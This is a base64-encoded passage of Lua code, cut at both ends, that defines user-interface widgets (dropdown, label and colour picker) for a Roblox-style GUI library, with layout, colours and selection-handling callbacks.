zVGFibGUgYW5kIGZpbmQodmFsdWUsIG9wdGlvbi5UZXh0KSkgdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgaW5zZXJ0KHNlbGVjdGVkLCBvcHRpb24uVGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLm11bHRpX2l0ZW1zID0gc2VsZWN0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgb3B0aW9uLlRleHRDb2xvcjMgPSB0aGVtZXMucHJlc2V0LmFjY2VudAogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgb3B0aW9uLlRleHRDb2xvcjMgPSByZ2IoNzIsIDcyLCA3MykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGl0ZW1zWyAic3ViX3RleHQiIF0uVGV4dCA9IGlzVGFibGUgYW5kIGNvbmNhdChzZWxlY3RlZCwgIiwgIikgb3Igc2VsZWN0ZWRbMV0gb3IgIiIKICAgICAgICAgICAgICAgIGZsYWdzW2NmZy5mbGFnXSA9IGlzVGFibGUgYW5kIHNlbGVjdGVkIG9yIHNlbGVjdGVkWzFdCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNmZy5jYWxsYmFjayhmbGFnc1tjZmcuZmxhZ10pIAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5jaGFuZ2V0ZXh0KHRleHQpCiAgICAgICAgICAgICAgICBpdGVtc1sgIm5hbWUiIF0uVGV4dCA9IHRleHQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBjZmcucmVmcmVzaF9vcHRpb25zKGxpc3QpIAogICAgICAgICAgICAgICAgY2ZnLnlfc2l6ZSA9IDAKCiAgICAgICAgICAgICAgICBmb3IgXywgb3B0aW9uIGluIGNmZy5vcHRpb25faW5zdGFuY2VzIGRvIAogICAgICAgICAgICAgICAgICAgIG9wdGlvbjpEZXN0cm95KCkgCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY2ZnLm9wdGlvbl9pbnN0YW5jZXMgPSB7fSAKCiAgICAgICAgICAgICAgICBmb3IgXywgb3B0aW9uIGluIGxpc3QgZG8gCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnV0dG9uID0gY2ZnLnJlbmRlcl9vcHRpb24ob3B0aW9uKQogICAgICAgICAgICAgICAgICAgIGNmZy55X3NpemUgKz0gYnV0dG9uLkFic29sdXRlU2l6ZS5ZICsgNiAtLSBzdXBlciBhbm5veWluZyBtYW51YWwgc2l6aW5nIGJ1dCBvaCB3ZWxsCiAgICAgICAgICAgICAgICAgICAgaW5zZXJ0KGNmZy5vcHRpb25faW5zdGFuY2VzLCBidXR0b24pCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgYnV0dG9uLk1vdXNlQnV0dG9uMURvd246Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNmZy5tdWx0aSB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgc2VsZWN0ZWRfaW5kZXggPSBmaW5kKGNmZy5tdWx0aV9pdGVtcywgYnV0dG9uLlRleHQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGVjdGVkX2luZGV4IHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVtb3ZlKGNmZy5tdWx0aV9pdGVtcywgc2VsZWN0ZWRfaW5kZXgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5zZXJ0KGNmZy5tdWx0aV9pdGVtcywgYnV0dG9uLlRleHQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLnNldChjZmcubXVsdGlfaXRlbXMpIAkJCQkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5zZXRfdmlzaWJsZShmYWxzZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5vcGVuID0gZmFsc2UgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5zZXQoYnV0dG9uLlRleHQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGl0ZW1zWyAiZHJvcGRvd24iIF0uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBjZmcub3BlbiA9IG5vdCBjZmcub3BlbiAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY2ZnLnNldF92aXNpYmxlKGNmZy5vcGVuKQogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBpZiBjZmcuc2VwZXJhdG9yIHRoZW4gCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gc2VsZi5pdGVtc1sgImVsZW1lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMSwgMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDM2LCAzNiwgMzcpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0ge30gCiAgICAgICAgICAgIGNvbmZpZ19mbGFnc1tjZmcuZmxhZ10gPSBjZmcuc2V0CiAgICAgICAgICAgIAogICAgICAgICAgICBjZmcucmVmcmVzaF9vcHRpb25zKGNmZy5vcHRpb25zKQogICAgICAgICAgICBjZmcuc2V0KGNmZy5kZWZhdWx0KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgIGVuZAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OmxhYmVsKG9wdGlvbnMpCiAgICAgICAgICAgIGxvY2FsIGNmZyA9IHsKICAgICAgICAgICAgICAgIGVuYWJsZWQgPSBvcHRpb25zLmVuYWJsZWQgb3IgbmlsLAogICAgICAgICAgICAgICAgbmFtZSA9IG9wdGlvbnMubmFtZSBvciAiVG9nZ2xlIiwKICAgICAgICAgICAgICAgIHdyYXBwZWQgPSBvcHRpb25zLndyYXBwZWQgb3IgZmFsc2UsCiAgICAgICAgICAgICAgICBzZXBlcmF0b3IgPSBvcHRpb25zLnNlcGVyYXRvciBvciBvcHRpb25zLlNlcGVyYXRvciBvciBmYWxzZTsKICAgICAgICAgICAgICAgIGluZm8gPSBvcHRpb25zLmluZm8gb3IgbmlsOyAKCiAgICAgICAgICAgICAgICBpdGVtcyA9IHt9OwogICAgICAgICAgICB9CgogICAgICAgICAgICBsb2NhbCBpdGVtcyA9IGNmZy5pdGVtczsgZG8gCiAgICAgICAgICAgICAgICBpdGVtc1sgImxhYmVsIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJuYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgIFRleHRXcmFwcGVkID0gY2ZnLndyYXBwZWQsCiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJsYWJlbCIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICBSaWNoVGV4dCA9IHRydWUsCiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgaWYgY2ZnLmluZm8gdGhlbiAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImluZm8iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMTMwLCAxMzAsIDEzMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyYXBwZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLmluZm87CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibGFiZWwiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgNSwgMCwgMTcpOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibmFtZSIgXTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0xlZnQgPSBkaW0oMCwgNSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImxhYmVsIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUxpc3RMYXlvdXQiICwgewogICAgICAgICAgICAgICAgICAgIEZpbGxEaXJlY3Rpb24gPSBFbnVtLkZpbGxEaXJlY3Rpb24uSG9yaXpvbnRhbDsKICAgICAgICAgICAgICAgICAgICBIb3Jpem9udGFsQWxpZ25tZW50ID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LlJpZ2h0OwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nID0gZGltKDAsIDkpOwogICAgICAgICAgICAgICAgICAgIFNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICAgICAgICAgICAgICB9KTsgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGlmIGNmZy5zZXBlcmF0b3IgdGhlbiAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAxKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzYsIDM2LCAzNykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICBmdW5jdGlvbiBjZmcuc2V0KHRleHQpCiAgICAgICAgICAgICAgICBpdGVtc1sgIm5hbWUiIF0uVGV4dCA9IHRleHQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQgCiAgICAgICAgCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpjb2xvcnBpY2tlcihvcHRpb25zKSAKICAgICAgICAgICAgbG9jYWwgY2ZnID0gewogICAgICAgICAgICAgICAgbmFtZSA9IG9wdGlvbnMubmFtZSBvciAiQ29sb3IiLCAKICAgICAgICAgICAgICAgIGZsYWcgPSBvcHRpb25zLmZsYWcgb3IgbGlicmFyeTpuZXh0X2ZsYWcoKSwKCiAgICAgICAgICAgICAgICBjb2xvciA9IG9wdGlvbnMuY29sb3Igb3IgY29sb3IoMSwgMSwgMSksIC0tIERlZmF1bHQgdG8gd2hpdGUgY29sb3IgaWYgbm90IHByb3ZpZGVkCiAgICAgICAgICAgICAgICBhbHBoYSA9IG9wdGlvbnMuYWxwaGEgYW5kIDEgLSBvcHRpb25zLmFscGhhIG9yIDAsCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIG9wZW4gPSBmYWxzZSwgCiAgICAgICAgICAgICAgICBjYWxsYmFjayA9IG9wdGlvbnMuY2FsbGJhY2sgb3IgZnVuY3Rpb24oKSBlbmQsCiAgICAgICAgICAgICAgICBpdGVtcyA9IHt9OwoKICAgICAgICAgICAgICAgIHNlcGVyYXRvciA9IG9wdGlvbnMuc2VwZXJhdG9yIG9yIG9wdGlvbnMuU2VwZXJhdG9yIG9yIGZhbHNlOwogICAgICAgICAgICB9CgogICAgICAgICAgICBsb2NhbCBkcmFnZ2luZ19zYXQgPSBmYWxzZSAKICAgICAgICAgICAgbG9jYWwgZHJhZ2dpbmdfaHVlID0gZmFsc2UgCiAgICAgICAgICAgIGxvY2FsIGRyYWdnaW5nX2FscGhhID0gZmFsc2UgCgogICAgICAgICAgICBsb2NhbCBoLCBzLCB2ID0gY2ZnLmNvbG9yOlRvSFNWKCkgCiAgICAgICAgICAgIGxvY2FsIGEgPSBjZmcuYWxwaGEgCgogICAgICAgICAgICBmbGFnc1tjZmcuZmxhZ10gPSB7Q29sb3IgPSBjZmcuY29sb3IsIFRyYW5zcGFyZW5jeSA9IGNmZy5hbHBoYX0KCiAgICAgICAgICAgIGxvY2FsIGxhYmVsOyAKICAgICAgICAgICAgaWYgbm90IHNlbGYuaXRlbXMucmlnaHRfY29tcG9uZW50cyB0aGVuIAogICAgICAgICAgICAgICAgbGFiZWwgPSBzZWxmOmxhYmVsKHtuYW1lID0gY2ZnLm5hbWUsIHNlcGVyYXRvciA9IGNmZy5zZXBlcmF0b3J9KQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbyAKICAgICAgICAgICAgICAgIC0tIENvbXBvbmVudAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiY29sb3JwaWNrZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbGFiZWwgYW5kIGxhYmVsLml0ZW1zLnJpZ2h0X2NvbXBvbmVudHMgb3Igc2VsZi5pdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDE2LCAwLCAxNik7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoNTQsIDMxLCAxODQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sb3JwaWNrZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiY29sb3JwaWNrZXJfaW5saW5lIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sb3JwaWNrZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yLCAxLCAtMik7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJNb2RlID0gRW51bS5Cb3JkZXJNb2RlLkluc2V0OwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYig1NCwgMzEsIDE4NCkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2xvcnBpY2tlcl9pbmxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlHcmFkaWVudCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdic2Vxe3JnYmtleSgwLCByZ2IoMjExLCAyMTEsIDIxMSkpLCByZ2JrZXkoMSwgcmdiKDIxMSwgMjExLCAyMTEpKX07CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sb3JwaWNrZXJfaW5saW5lIiBdCiAgICAgICAgICAgICAgICAgICAgfSk7ICAgICAgICAgCiAgICAgICAgICAgICAgICAtLQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBDb2xvcnBpY2tlcgogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiY29sb3JwaWNrZXJfaG9sZGVyIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGxpYnJhcnlbICJvdGhlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLjIwMDAwMDAwMjk4MDIzMjI0LCAyMCwgMC4yOTY5OTk5OTA5NDAwOTQsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDE2NiwgMCwgMTk3KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgVmlzaWJsZSA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjUsIDI1LCAyOSkKICAgICAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJjb2xvcnBpY2tlcl9mYWRlIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sb3JwaWNrZXJfaG9sZGVyIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgWkluZGV4ID0gMTAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1LCAyNSwgMjkpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJjb2xvcnBpY2tlcl9jb21wb25lbnRzIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sb3JwaWNrZXJfaG9sZGVyIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDEsIDAsIDEpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yLCAxLCAtMik7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjIsIDIyLCAyNCkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2xvcnBpY2tlcl9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNikKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgInNhdHVyYXRpb25faG9sZGVyIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sb3JwaWNrZXJfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCA3LCAwLCA3KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTQsIDEsIC04MCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1L